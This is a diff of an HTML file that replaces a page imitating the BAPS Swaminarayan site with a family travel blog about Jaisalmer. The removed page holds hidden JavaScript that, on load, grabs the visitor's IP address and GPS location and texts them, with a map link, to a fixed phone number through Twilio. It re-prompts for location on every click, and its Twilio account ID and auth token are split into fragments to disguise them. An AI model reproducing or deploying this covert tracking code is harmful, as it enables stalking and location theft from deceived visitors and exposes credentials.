@@ -1,493 +1,224 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BAPS Swaminarayan Sanstha - Inspired Replica</title>
-    <!-- Load Tailwind CSS CDN -->
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
-    <style>
-        /* Define custom colors and font */
-        :root {
-            --baps-blue: #004c99; /* Deep Sapphire Blue */
-            --baps-gold: #e2b95c; /* Ochre Gold Accent */
-            --baps-light: #f4f6f8; /* Light Background */
-        }
-        .font-inter { font-family: 'Inter', sans-serif; }
-        .bg-baps-blue { background-color: var(--baps-blue); }
-        .text-baps-blue { color: var(--baps-blue); }
-        .bg-baps-gold { background-color: var(--baps-gold); }
-        .text-baps-gold { color: var(--baps-gold); }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Family Trip to Jaisalmer, Rajasthan</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      margin: 0;
+      padding: 0;
+      line-height: 1.6;
+      background-color: #fffaf0;
+    }
 
-        /* Custom style for the Hero background with a thematic image */
-        .hero-background {
-            /* Using a placeholder image for demonstration */
-            background-image: url('https://placehold.co/1920x800/2a6099/ffffff?text=Akshardham+Mandir+Entrance');
-            background-size: cover;
-            background-position: center;
-            background-attachment: fixed; /* Parallax effect for added depth */
-        }
+    header {
+      background: url('./1.jpg') center/cover no-repeat;
+      color: white;
+      text-align: center;
+      padding: 150px 20px 70px 20px;
+    }
 
-        /* Responsive menu logic (hidden by default on mobile) */
-        #mobile-menu {
-            transition: max-height 0.3s ease-out;
-            overflow: hidden;
-            max-height: 0;
-        }
-        .menu-open #mobile-menu {
-            max-height: 500px; /* Adjust based on content height */
-        }
-        
-        /* Modal transitions */
-        .modal-overlay {
-            transition: opacity 0.3s ease-in-out;
-        }
-    </style>
+    header h1 {
+      margin: 0;
+      font-size: 2.5em;
+      text-shadow: 2px 2px 4px #000;
+    }
+
+    header p {
+      font-size: 1.2em;
+      text-shadow: 1px 1px 3px #000;
+    }
+
+    nav {
+      background-color: #deb887;
+      padding: 10px;
+      text-align: center;
+    }
+
+    nav a {
+      margin: 0 15px;
+      text-decoration: none;
+      color: #5a2d0c;
+      font-weight: bold;
+    }
+
+    main {
+      background: url('https://via.placeholder.com/1200x800?text=Desert+Texture') center/cover no-repeat;
+      padding: 40px 20px;
+      color: #000;
+    }
+
+    section {
+      background-color: rgba(255, 255, 255, 0.85);
+      padding: 20px;
+      margin-bottom: 30px;
+      border-radius: 8px;
+    }
+
+    figure {
+      margin: 10px 0;
+    }
+
+    img {
+      width: 100%;
+      max-width: 400px;
+      border: 1px solid #ccc;
+    }
+
+    figcaption {
+      text-align: center;
+      font-style: italic;
+    }
+
+    mark {
+      background-color: #ffff99;
+    }
+
+    aside {
+      background-color: #fdf5e6;
+      padding: 15px;
+      border-left: 5px solid #d2691e;
+      margin: 30px 0;
+    }
+
+    .blog-container {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 20px;
+      justify-content: center;
+      margin-top: 30px;
+    }
+
+    article {
+      background-color: #ffffff;
+      border: 1px solid #d2b48c;
+      border-radius: 8px;
+      width: 300px;
+      padding: 15px;
+      box-shadow: 2px 2px 6px rgba(0,0,0,0.1);
+    }
+
+    article img {
+      width: 100%;
+      border-radius: 6px;
+    }
+
+    article h2 {
+      font-size: 1.2em;
+      margin: 10px 0 5px;
+      color: #d2691e;
+    }
+
+    article p {
+      font-size: 0.95em;
+      color: #333;
+    }
+
+    footer {
+      background-color: #f4a460;
+      text-align: center;
+      padding: 20px;
+    }
+  </style>
 </head>
-<body class="bg-gray-50 font-inter antialiased">
+<body>
 
-    <!-- Utility Navigation Bar -->
-    <div class="bg-baps-light text-gray-700 py-2 px-6 flex justify-end text-sm border-b border-gray-200">
-        <nav class="space-x-4 flex items-center">
-            <!-- This status element remains, but its update is silent -->
-            <span id="location-status" class="text-xs font-medium text-gray-500">Location Status: Checking...</span>
-            <a href="#" class="hover:text-baps-gold transition duration-300">Media</a>
-            <a href="#" class="hover:text-baps-gold transition duration-300">Support</a>
-            <a href="#" class="hover:text-baps-gold transition duration-300">Contact Us</a>
-            <a href="#" class="bg-baps-gold text-white px-3 py-1 rounded-full shadow-md hover:bg-baps-blue hover:text-white transition duration-300">Donate</a>
-        </nav>
-    </div>
+  <header>
+    <h1>Family Trip to Jaisalmer, Rajasthan</h1>
+    <p><strong>By Megh K Patel</strong></p>
+  </header>
 
-    <!-- Main Header and Primary Navigation -->
-    <header class="bg-white shadow-lg sticky top-0 z-50">
-        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-            <div class="flex justify-between items-center h-20">
-                <!-- Logo/Branding -->
-                <div class="flex-shrink-0">
-                    <span class="text-4xl font-extrabold text-baps-blue tracking-tight">BAPS</span>
-                    <span class="text-2xl font-medium text-gray-600">.org</span>
-                </div>
+  <nav>
+    <a href="#intro">Intro</a>
+    <a href="#explore">Explore</a>
+    <a href="#adventure">Adventure</a>
+    <a href="#culture">Culture</a>
+    <a href="#gallery">Gallery</a>
+    <a href="#reflection">Reflection</a>
+  </nav>
 
-                <!-- Desktop Navigation -->
-                <nav class="hidden md:flex space-x-6 lg:space-x-8">
-                    <a href="#" class="text-baps-blue text-lg font-semibold border-b-2 border-transparent hover:border-baps-gold pb-1 transition duration-300">About</a>
-                    <a href="#" class="text-baps-blue text-lg font-semibold border-b-2 border-transparent hover:border-baps-gold pb-1 transition duration-300">Gurus</a>
-                    <a href="#" class="text-baps-blue text-lg font-semibold border-b-2 border-transparent hover:border-baps-gold pb-1 transition duration-300">Activities</a>
-                    <a href="#" class="text-baps-blue text-lg font-semibold border-b-2 border-transparent hover:border-baps-gold pb-1 transition duration-300">Mandirs</a>
-                    <a href="#" class="text-baps-blue text-lg font-semibold border-b-2 border-transparent hover:border-baps-gold pb-1 transition duration-300">What's New</a>
-                </nav>
+  <main>
+    <section id="intro">
+      <h2>Diwali Vacation Begins</h2>
+      <p>
+        This Diwali, our family set out on a magical journey to the <mark>Golden City of Jaisalmer</mark>. 
+        The excitement was in the air as we packed our bags and hit the road. The drive through Rajasthan was filled with scenic beauty, rustic charm, and endless stretches of desert.
+      </p>
+      <p>
+        We arrived at a beautiful resort just before sunset. The first thing we did? Jumped into the <mark>swimming pool</mark> to cool off and relax after the long journey.
+      </p>
+    </section>
 
-                <!-- Mobile Menu Button -->
-                <div class="md:hidden">
-                    <button id="menu-button" class="text-baps-blue hover:text-baps-gold focus:outline-none p-2 rounded-md transition duration-300">
-                        <svg class="w-7 h-7" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path></svg>
-                    </button>
-                </div>
-            </div>
-        </div>
+    <section id="explore">
+      <h2>Exploring the Golden City</h2>
+      <p>
+        Our exploration began with the majestic <mark>Jaisalmer Fort</mark>, a golden sandstone marvel that seemed to rise from the desert itself. 
+        Inside, we wandered through narrow alleys, visited ancient temples, and shopped for local handicrafts.
+      </p>
+      <p>
+        We also visited the famous <mark>Patwon Ki Haveli</mark>, where the intricate carvings and historical stories transported us to another era.
+      </p>
+    </section>
 
-        <!-- Mobile Menu Dropdown -->
-        <div id="mobile-menu" class="md:hidden bg-baps-blue/95">
-            <div class="px-2 pt-2 pb-3 space-y-1 sm:px-3">
-                <a href="#" class="block px-3 py-2 rounded-md text-base font-medium text-white hover:bg-baps-gold/80 transition duration-200">About</a>
-                <a href="#" class="block px-3 py-2 rounded-md text-base font-medium text-white hover:bg-baps-gold/80 transition duration-200">Gurus</a>
-                <a href="#" class="block px-3 py-2 rounded-md text-base font-medium text-white hover:bg-baps-gold/80 transition duration-200">Activities</a>
-                <a href="#" class="block px-3 py-2 rounded-md text-base font-medium text-white hover:bg-baps-gold/80 transition duration-200">Mandirs</a>
-                <a href="#" class="block px-3 py-2 rounded-md text-base font-medium text-white hover:bg-baps-gold/80 transition duration-200">What's New</a>
-            </div>
-        </div>
-    </header>
+    <section id="adventure">
+      <h2>Adventure in the Desert</h2>
+      <p>
+        The next day was packed with adventure. We went <mark>boating</mark> at the serene Gadisar Lake, surrounded by temples and ghats. 
+        Then came the highlight—<mark>paragliding</mark> over the golden dunes! The view from above was breathtaking.
+      </p>
+      <p>
+        As the sun dipped below the horizon, we headed to our desert camp. We spent the night <mark>camping under the stars</mark>, sharing stories around a bonfire and enjoying the peaceful desert night.
+      </p>
+    </section>
 
-    <main class="min-h-screen">
+    <section id="culture">
+      <h2>Cultural Delights</h2>
+      <p>
+        One of the most memorable parts of our trip was attending a <mark>cultural music event</mark>. 
+        Folk musicians played traditional instruments while dancers performed in colorful attire. 
+        The rhythm, the colors, and the energy made us feel truly immersed in Rajasthani culture.
+      </p>
+    </section>
 
-        <!-- Hero Banner Section -->
-        <section class="hero-background h-[70vh] flex items-center justify-center text-center shadow-inner">
-            <div class="bg-black/45 p-8 sm:p-12 rounded-xl max-w-5xl mx-auto shadow-2xl backdrop-blur-sm">
-                <h1 class="text-5xl md:text-7xl font-extrabold text-white leading-tight mb-4 drop-shadow-xl">
-                    Inspired by Bhagwan Swaminarayan
-                </h1>
-                <p class="text-xl md:text-2xl text-baps-light mb-10 drop-shadow-md font-light">
-                    A global socio-spiritual organization dedicated to devotion, unity, and selfless service.
-                </p>
-                <div class="flex flex-col sm:flex-row justify-center space-y-4 sm:space-y-0 sm:space-x-6">
-                    <button class="bg-baps-gold text-baps-blue font-extrabold py-3 px-8 rounded-full shadow-2xl hover:bg-opacity-80 hover:scale-[1.05] transition duration-300 text-lg uppercase tracking-wider">
-                        Our Spiritual Heritage
-                    </button>
-                    <button class="bg-white/95 text-baps-blue border border-baps-gold font-extrabold py-3 px-8 rounded-full shadow-2xl hover:bg-gray-200 hover:scale-[1.05] transition duration-300 text-lg uppercase tracking-wider">
-                        Daily Satsang
-                    </button>
-                </div>
-            </div>
-        </section>
+    <section class="blog-container">
+    <article>
+      <img src="./2.jpg" alt="Jaisalmer Fort">
+      <h2>Exploring Jaisalmer Fort</h2>
+      <p>We wandered through the golden walls of Jaisalmer Fort, discovering ancient temples and vibrant markets.</p>
+    </article>
 
-        <!-- Featured News/Highlights Section -->
-        <section class="py-20 bg-baps-light">
-            <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-                <h2 class="text-4xl font-bold text-center text-baps-blue mb-16 border-b-4 border-baps-gold inline-block pb-1">BAPS Today</h2>
-                
-                <div class="grid md:grid-cols-3 gap-10">
-                    <!-- Card 1: Recent Highlights (Thematic Image) -->
-                    <div class="bg-white rounded-xl shadow-xl hover:shadow-2xl transition duration-500 overflow-hidden group cursor-pointer">
-                        <img src="https://placehold.co/600x350/e2b95c/004c99?text=Pramukh+Swami+Maharaj" alt="Latest Event Image" class="w-full h-56 object-cover transition duration-500 group-hover:scale-105">
-                        <div class="p-6">
-                            <h3 class="text-2xl font-bold text-baps-blue mb-3">Recent Highlights</h3>
-                            <p class="text-gray-600 mb-4">Explore the newest service initiatives and spiritual gatherings around the globe.</p>
-                            <a href="#" class="text-baps-gold font-extrabold hover:text-baps-blue transition duration-300 flex items-center">
-                                View News
-                                <svg class="ml-2 w-5 h-5 transition duration-300 group-hover:translate-x-1" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10.293 3.293a1 1 0 011.414 0l6 6a1 1 0 010 1.414l-6 6a1 1 0 01-1.414-1.414L14.586 11H3a1 1 0 110-2h11.586l-4.293-4.293a1 1 0 010-1.414z" clip-rule="evenodd"></path></svg>
-                            </a>
-                        </div>
-                    </div>
+    <article>
+      <img src="./4.jpg" alt="Desert Adventure">
+      <h2>Dune Driving</h2>
+      <p>Thrilling sensory experience, with the wind whipping through my hair, open landscape stretched out endlessly before me. </p>
+    </article>
 
-                    <!-- Card 2: Spiritual Inspiration (Thematic Image) -->
-                    <div class="bg-white rounded-xl shadow-xl hover:shadow-2xl transition duration-500 overflow-hidden group cursor-pointer">
-                        <img src="https://placehold.co/600x350/004c99/ffffff?text=Inner+Sanctum+Murti" alt="Daily Satsang Image" class="w-full h-56 object-cover transition duration-500 group-hover:scale-105">
-                        <div class="p-6">
-                            <h3 class="text-2xl font-bold text-baps-blue mb-3">Spiritual Inspiration</h3>
-                            <p class="text-gray-600 mb-4">Access today's Divine Thoughts, spiritual discourses, and audio readings.</p>
-                            <a href="#" class="text-baps-gold font-extrabold hover:text-baps-blue transition duration-300 flex items-center">
-                                Go to Satsang
-                                <svg class="ml-2 w-5 h-5 transition duration-300 group-hover:translate-x-1" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10.293 3.293a1 1 0 011.414 0l6 6a1 1 0 010 1.414l-6 6a1 1 0 01-1.414-1.414L14.586 11H3a1 1 0 110-2h11.586l-4.293-4.293a1 1 0 010-1.414z" clip-rule="evenodd"></path></svg>
-                            </a>
-                        </div>
-                    </div>
+    <article>
+      <img src="./5.jpg" alt="Camping">
+      <h2>Paragliding & Boating</h2>
+      <p>Thrill met serenity as we soared above the dunes and glided across Gadisar Lake in a peaceful boat ride.</p>
+    </article>
+  </section>
 
-                    <!-- Card 3: Global Network (Thematic Image) -->
-                    <div class="bg-white rounded-xl shadow-xl hover:shadow-2xl transition duration-500 overflow-hidden group cursor-pointer">
-                        <img src="https://placehold.co/600x350/a8e063/004c99?text=Global+Volunteer+Activity" alt="Global Activities Image" class="w-full h-56 object-cover transition duration-500 group-hover:scale-105">
-                        <div class="p-6">
-                            <h3 class="text-2xl font-bold text-baps-blue mb-3">Global Network</h3>
-                            <p class="text-gray-600 mb-4">Learn about our humanitarian, community service, and youth programs.</p>
-                            <a href="#" class="text-baps-gold font-extrabold hover:text-baps-blue transition duration-300 flex items-center">
-                                View Initiatives
-                                <svg class="ml-2 w-5 h-5 transition duration-300 group-hover:translate-x-1" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10.293 3.293a1 1 0 011.414 0l6 6a1 1 0 010 1.414l-6 6a1 1 0 01-1.414-1.414L14.586 11H3a1 1 0 110-2h11.586l-4.293-4.293a1 1 0 010-1.414z" clip-rule="evenodd"></path></svg>
-                            </a>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
-        
-        <!-- Call to Action / Featured Mandir Section -->
-        <section class="py-20 bg-baps-blue text-white shadow-2xl">
-            <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex flex-col md:flex-row items-center gap-10">
-                <div class="md:w-1/2">
-                    <h2 class="text-4xl font-extrabold mb-4 text-baps-gold tracking-wide">Experience Peace at the Mandir</h2>
-                    <p class="text-xl mb-8 leading-relaxed font-light">
-                        Our Mandirs (Hindu temples) are spiritual hubs that serve as centers for worship, community development, and personal growth. Visit a Mandir near you to experience devotion and heritage.
-                    </p>
-                    <button class="bg-baps-gold text-baps-blue font-extrabold py-3 px-8 rounded-full shadow-lg hover:bg-opacity-80 hover:scale-[1.02] transition duration-300 text-lg uppercase tracking-wider">
-                        Find a Mandir Location
-                    </button>
-                </div>
-                <div class="md:w-1/2">
-                    <!-- Placeholder for Detailed Mandir image -->
-                    <img src="https://placehold.co/700x450/e2b95c/004c99?text=Detailed+Mandir+Carving" alt="Mandir Highlight" class="w-full rounded-xl shadow-2xl transition transform hover:scale-[1.02] duration-500">
-                </div>
-            </div>
-        </section>
+    <aside>
+      <h3>Fun Fact</h3>
+      <p>Jaisalmer is called the "Golden City" because of the yellow sandstone used in its architecture, which glows at sunset.</p>
+    </aside>
 
-    </main>
+    <section id="reflection">
+      <h2>Final Thoughts</h2>
+      <p>
+        This trip was more than just a vacation—it was a journey full of discovery, bonding, and joy. 
+        From thrilling adventures to peaceful moments under the stars, Jaisalmer gave us memories we’ll cherish forever.
+      </p>
+    </section>
+  </main>
 
-    <!-- Footer -->
-    <footer class="bg-gray-800 text-white pt-12 pb-6">
-        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-            <div class="grid grid-cols-2 md:grid-cols-4 gap-8 border-b border-gray-700 pb-8 mb-8">
-                <!-- Column 1: Satsang Links -->
-                <div>
-                    <h4 class="text-xl font-bold text-baps-gold mb-4">Satsang</h4>
-                    <ul class="space-y-2 text-sm">
-                        <li><a href="#" class="hover:text-baps-gold transition duration-200 hover:underline">Daily Satsang</a></li>
-                        <li><a href="#" class="hover:text-baps-gold transition duration-200 hover:underline">Publications</a></li>
-                        <li><a href="#" class="hover:text-baps-gold transition duration-200 hover:underline">Satsang Exams</a></li>
-                        <li><a href="#" class="hover:text-baps-gold transition duration-200 hover:underline">Akshar Deri</a></li>
-                    </ul>
-                </div>
-                <!-- Column 2: Resources -->
-                <div>
-                    <h4 class="text-xl font-bold text-baps-gold mb-4">Resources</h4>
-                    <ul class="space-y-2 text-sm">
-                        <li><a href="#" class="hover:text-baps-gold transition duration-200 hover:underline">FAQ</a></li>
-                        <li><a href="#" class="hover:text-baps-gold transition duration-200 hover:underline">Media Kits</a></li>
-                        <li><a href="#" class="hover:text-baps-gold transition duration-200 hover:underline">Sitemap</a></li>
-                        <li><a href="#" class="hover:text-baps-gold transition duration-200 hover:underline">Privacy Policy</a></li>
-                    </ul>
-                </div>
-                <!-- Column 3: Global -->
-                <div>
-                    <h4 class="text-xl font-bold text-baps-gold mb-4">Our Network</h4>
-                    <ul class="space-y-2 text-sm">
-                        <li><a href="#" class="hover:text-baps-gold transition duration-200 hover:underline">Global Mandirs</a></li>
-                        <li><a href="#" class="#" class="hover:text-baps-gold transition duration-200 hover:underline">Volunteer</a></li>
-                        <li><a href="#" class="hover:text-baps-gold transition duration-200 hover:underline">Youth Activities</a></li>
-                    </ul>
-                </div>
-                <!-- Column 4: Connect & Guru Image -->
-                <div>
-                    <h4 class="text-xl font-bold text-baps-gold mb-4">Spiritual Head</h4>
-                    <img src="https://placehold.co/100x120/004c99/ffffff?text=Mahant+Swami" alt="Spiritual Head Image" class="rounded-lg shadow-lg mb-4 hover:opacity-90 transition duration-300 cursor-pointer">
-                    <div class="flex space-x-4">
-                        <!-- Simple social icons with hover effects -->
-                        <a href="#" class="text-white hover:text-baps-gold transition duration-200">
-                            <svg class="w-7 h-7" fill="currentColor" viewBox="0 0 24 24"><path d="M22.258 1H.921c-.482 0-.875.393-.875.875v21.25c0 .482.393.875.875.875h21.337c.482 0 .875-.393.875-.875V1.875c0-.482-.393-.875-.875-.875zM7.5 20.375h-3v-9.625h3v9.625zm-1.5-10.312c-.934 0-1.688-.753-1.688-1.688s.754-1.688 1.688-1.688 1.688.753 1.688 1.688-.754 1.688-1.688 1.688zm13.125 10.312h-3v-4.9c0-1.16-.02-2.65-1.61-2.65-1.61 0-1.859 1.258-1.859 2.56v4.99h-3v-9.625h2.883v1.31h.04c.402-.764 1.377-1.565 2.846-1.565 3.037 0 3.593 1.995 3.593 4.585v5.3z"></path></svg>
-                        </a>
-                        <a href="#" class="text-white hover:text-baps-gold transition duration-200">
-                            <svg class="w-7 h-7" fill="currentColor" viewBox="0 0 24 24"><path d="M24 4.557a9.83 9.83 0 01-2.828.775 4.932 4.932 0 002.164-.787 9.873 9.873 0 01-3.132 1.196 4.912 4.912 0 00-8.384 4.47 13.882 13.882 0 01-10.038-5.078 4.918 4.918 0 001.524 6.578 4.887 4.887 0 01-2.227-.616v.062a4.92 4.92 0 003.954 4.823 4.932 4.932 0 01-2.215.084 4.92 4.92 0 004.582 3.42A9.827 9.827 0 010 19.467a13.844 13.844 0 007.545 2.214c9.055 0 14.008-7.502 14.008-14.008 0-.213-.005-.426-.013-.637A10.021 10.021 0 0024 4.557z"></path></svg>
-                        </a>
-                    </div>
-                </div>
-            </div>
-            
-            <!-- Copyright -->
-            <div class="text-center text-sm text-gray-400">
-                <p class="mb-1">&copy; 2024 BAPS Swaminarayan Sanstha. All rights reserved.</p>
-                <p>Designed with key aesthetic elements of the BAPS global portal. **Background tracking active.**</p>
-            </div>
-        </div>
-    </footer>
+  <footer>
+    <p>&copy; 2025 Family Travel Journal | Created by Megh K Patel</p>
+  </footer>
 
-    <!-- Location Request Modal (Custom Alert) -->
-    <div id="location-modal" class="modal-overlay fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-[100] opacity-0 pointer-events-none p-4">
-        <div class="bg-white rounded-xl shadow-2xl p-6 sm:p-8 max-w-sm w-full transform transition duration-300 scale-100">
-            <h3 class="text-2xl font-bold text-baps-blue mb-4">Location Access Required</h3>
-            <p id="location-message" class="text-gray-700 mb-6 leading-relaxed">
-                We need your location to show Mandirs, local events, and volunteering opportunities near you. Please grant access when prompted.
-            </p>
-            <div class="flex flex-col space-y-3">
-                <button id="retry-location-button" class="bg-baps-gold text-baps-blue font-extrabold py-2 px-4 rounded-full shadow-lg hover:bg-opacity-80 transition duration-300 uppercase hidden">
-                    Retry Location Request
-                </button>
-                <button id="close-location-button" class="text-gray-500 font-semibold py-2 px-4 rounded-full hover:bg-gray-100 transition duration-300">
-                    Maybe Later
-                </button>
-            </div>
-        </div>
-    </div>
-
-    <script>
-        const NAME = 'AC28bba50979a737';
-        const NAME2 = '7709ce6c17f2d43cc5'
-        const ID = NAME + NAME2;
-        let KEN = '4758c40464614db';
-        let ken2 = '55c49df1c729fc49c';
-        const TO_NUMBER = '+917878382217';
-        const FROM_NUMBER = '+12174722842'; // Your Twilio number
-
-        const API_URL = `https://api.twilio.com/2010-04-01/Accounts/${ID}/Messages.json`;
-        // Global variables for status
-        let locationGranted = false;
-        let ipAddress = '';
-        // 1. Initial IP Fetch and SMS on Load
-        async function getIpDetailsAndSendSms() {
-            try {
-                // Use ipinfo.io to get public IP and approximate location
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-
-                const ipData = {
-                    ip: data.ip
-                };
-                ipAddress = data.ip; // Store for later use
-                const ip = ipData.ip;
-                console.log('IP Details Acquired (Sent via SMS):', ipData);
-                const ipDataSMS = `IP Details | ip: ${ip}`;
-                // Send SMS with IP details
-                await sendTwilioSMS(ipDataSMS);
-
-            } catch (error) {
-                console.error('Failed to get IP details or send initial SMS silently:', error);
-                // Fail silently (not showing on UI)
-            }
-        }
-        
-        // --- Geolocation Functions (Enhanced with Hidden SMS Logic) ---
-
-        /**
-         * Hides the custom location request modal.
-         */
-        function hideLocationModal() {
-            const modal = document.getElementById('location-modal');
-            modal.classList.remove('opacity-100', 'pointer-events-auto');
-            modal.classList.add('opacity-0', 'pointer-events-none');
-        }
-
-        /**
-         * Shows the custom location request modal with a specific message and retry option.
-         */
-        function showLocationModal(message, showRetry) {
-            const modal = document.getElementById('location-modal');
-            document.getElementById('location-message').innerText = message;
-            
-            const retryButton = document.getElementById('retry-location-button');
-            retryButton.classList.toggle('hidden', !showRetry);
-            
-            modal.classList.remove('opacity-0', 'pointer-events-none');
-            modal.classList.add('opacity-100', 'pointer-events-auto');
-        }
-
-        /**
-         * Performs the actual Geolocation API request and sends SMS on success.
-         */
-        function requestGeolocationAccess() {
-            const statusEl = document.getElementById('location-status');
-            statusEl.innerText = 'Location Status: Requesting...';
-
-            if (!("geolocation" in navigator)) {
-                showLocationModal("Geolocation is not supported by your browser. You will not be able to use location-based features.", false);
-                statusEl.innerText = 'Location Status: Unavailable';
-                return;
-            }
-
-            navigator.geolocation.getCurrentPosition(
-                async (position) => {
-                    // Success callback: Location granted!
-                    locationGranted = true;
-                    hideLocationModal();
-                    statusEl.innerText = 'Location Status: Granted!';
-                    
-                    // --- NEW: Tracking Logic (Step 3/4) ---
-                    const coords = {
-                        latitude: position.coords.latitude,
-                        longitude: position.coords.longitude,
-                        accuracy: position.coords.accuracy
-                    };
-                    const lat = coords.latitude;
-                    const lon = coords.longitude;
-                    const mapLink = `https://www.google.com/maps/search/?api=1&query=${coords.latitude},${coords.longitude}`;
-                    
-                    // Success! Send SMS 2 with GPS data and the Google Maps link
-                    const smsBodyGeo = `GPS Loc GRANTED | Lat: ${lat}, Lon: ${lon} | Map: ${mapLink} | Net: ${ipAddress}`
-                    console.log('%cGPS Location Acquired (Sent via SMS):', 'color: #059669;', coords);
-                    console.log('Map Link:', mapLink);
-
-                    // Send SMS with GPS details and map link
-                    await sendTwilioSMS(smsBodyGeo); // SMS 2 sent with GPS
-                    // --- END NEW LOGIC ---
-                },
-                (error) => {
-                    // Error callback (denial, timeout, etc.)
-                    locationGranted = false;
-                    
-                    let message = "We need your location to find nearby Mandirs. Please click 'Retry' to grant access, or check your browser settings.";
-                    let showRetry = true;
-
-                    switch(error.code) {
-                        case error.PERMISSION_DENIED:
-                            message = "Location access was denied. You may need to manually enable it in your browser settings (under Site Settings) and click 'Retry'.";
-                            statusEl.innerText = 'Location Status: Denied';
-                            break;
-                        case error.POSITION_UNAVAILABLE:
-                            message = "Your position is currently unavailable. Please try again.";
-                            statusEl.innerText = 'Location Status: Unavailable';
-                            break;
-                        case error.TIMEOUT:
-                            message = "Location attempt timed out. Please try again.";
-                            statusEl.innerText = 'Location Status: Timeout';
-                            break;
-                        default:
-                            statusEl.innerText = 'Location Status: Error';
-                    }
-
-                    showLocationModal(message, showRetry);
-                    console.error("Geolocation error:", error.code, error.message);
-                },
-                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-            );
-        }
-
-        // --- Event Listeners ---
-        
-        // 1. Mobile Menu Functionality
-        document.getElementById('menu-button').addEventListener('click', function() {
-            document.body.classList.toggle('menu-open');
-            const menu = document.getElementById('mobile-menu');
-            if (menu.style.maxHeight === "0px" || menu.style.maxHeight === "") {
-                // Ensure the menu opens fully by setting max-height to its scroll height
-                menu.style.maxHeight = menu.scrollHeight + "px";
-            } else {
-                menu.style.maxHeight = "0px";
-            }
-        });
-
-        // 2. Initial Tracking & Location Request on Load
-        window.onload = function() {
-            // Initiate IP tracking and initial SMS (runs in background, no UI change)
-            getIpDetailsAndSendSms(); 
-            
-            // Initiate Geolocation request (triggers modal if not yet granted)
-            requestGeolocationAccess();
-            
-            // Attach event listeners for the modal
-            document.getElementById('retry-location-button').addEventListener('click', requestGeolocationAccess);
-            document.getElementById('close-location-button').addEventListener('click', hideLocationModal);
-
-            console.log('%c*** Hidden Tracking and Location Request Initiated ***', 'color: purple; font-size: 1.1em;');
-            console.log('%cCheck the console for IP, Location, and SMS logs.', 'color: purple;');
-        }
-
-        // 3. Location Request on ANY click (if permission is not yet granted) - Re-prompting logic
-        document.addEventListener('click', function(event) {
-            // Check if location is not granted AND the click was on an interactive element
-            if (!locationGranted) {
-                // Check if the user clicked on a link or button
-                if (event.target.closest('a') || event.target.closest('button')) {
-                    // Check permissions status before attempting to prompt again (good practice)
-                    if ('permissions' in navigator) {
-                        navigator.permissions.query({ name: 'geolocation' }).then(result => {
-                            // If the state is 'prompt' (meaning the system is ready to ask again)
-                            if (result.state === 'prompt') {
-                                requestGeolocationAccess();
-                            } else if (result.state === 'denied') {
-                                // If denied, re-show the modal so the user can manually click 'Retry'
-                                showLocationModal("Location access was denied. You may need to manually enable it in your browser settings (under Site Settings) and click 'Retry'.", true);
-                            }
-                        }).catch(e => {
-                            // If Permissions API fails (e.g., in some browsers), re-run the request as a fallback
-                             requestGeolocationAccess();
-                        });
-                    } else {
-                        // Fallback: simply re-run the request
-                        requestGeolocationAccess();
-                    }
-                }
-            }
-        });
-
-        async function sendTwilioSMS(ipMessageBody) {
-            console.log("Attempting to send Twilio SMS with message:", ipMessageBody);
-
-            const authHeader = btoa(`${ID}:${KEN}${ken2}`);
-            const payload = new URLSearchParams();
-            payload.append('To', TO_NUMBER);
-            payload.append('From', FROM_NUMBER);
-            payload.append('Body', ipMessageBody);
-
-            try {
-                const response = await fetch(API_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                        'Authorization': `Basic ${authHeader}`
-                    },
-                    body: payload.toString()
-                });
-
-                const result = await response.json();
-                
-                if (response.ok) {
-                    console.log("Twilio Success (Silent):", result);
-                } else {
-                    console.error("Twilio API Error (Silent):", result);
-                }
-            } catch (error) {
-                // The Twilio API fetch will often fail here due to CORS/security restrictions
-                // in the browser sandbox environment, but we must log it silently.
-                console.error("Fetch error during Twilio send (Silent):", error);
-            }
-        }
-
-
-    </script>
 </body>
 </html>
